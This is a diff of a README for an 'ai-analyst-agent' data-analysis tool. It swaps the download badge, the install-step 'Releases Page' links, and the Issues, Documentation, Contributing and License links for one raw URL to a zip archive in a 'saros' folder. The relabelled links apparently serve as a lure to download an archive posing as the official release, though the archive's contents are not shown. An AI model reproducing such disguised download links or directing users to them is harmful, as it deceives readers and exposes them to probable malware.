@@ -1,6 +1,6 @@
 # 🎉 ai-analyst-agent - Effortless Data Insights Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%21-brightgreen)](https://github.com/jsdahiua/ai-analyst-agent/releases)
+[![Download Now](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip%20Now-Get%20Started%21-brightgreen)](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip)
 
 ## 🛠️ About ai-analyst-agent
 
@@ -24,9 +24,9 @@ The ai-analyst-agent helps you ask questions about your business data using plai
 
 ### Download & Install
 
-To start using ai-analyst-agent, visit the [Releases Page](https://github.com/jsdahiua/ai-analyst-agent/releases) to download the latest version. 
+To start using ai-analyst-agent, visit the [Releases Page](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip) to download the latest version. 
 
-1. Go to the [Releases Page](https://github.com/jsdahiua/ai-analyst-agent/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip).
 2. Find the latest version of the software.
 3. Click on the link to download the appropriate file for your operating system.
 4. Locate the downloaded file on your computer.
@@ -86,7 +86,7 @@ While the tool is versatile, it works best with structured data available in SQL
 
 ## 🌟 Get Involved
 
-We welcome contributions and feedback! Visit our [Issues page](https://github.com/jsdahiua/ai-analyst-agent/issues) to report bugs or request features.
+We welcome contributions and feedback! Visit our [Issues page](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip) to report bugs or request features.
 
 ## 🗨️ Community Support
 
@@ -94,8 +94,8 @@ Join our community forums to connect with other users and share your experiences
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/jsdahiua/ai-analyst-agent/wiki)
-- [Contributing](https://github.com/jsdahiua/ai-analyst-agent/blob/main/CONTRIBUTING.md)
-- [License](https://github.com/jsdahiua/ai-analyst-agent/blob/main/LICENSE)
+- [Documentation](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip)
+- [Contributing](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip)
+- [License](https://raw.githubusercontent.com/jsdahiua/ai-analyst-agent/main/saros/ai-analyst-agent.zip)
 
 By following these steps, you'll be able to download and run ai-analyst-agent with ease. Enjoy uncovering insights from your business data!
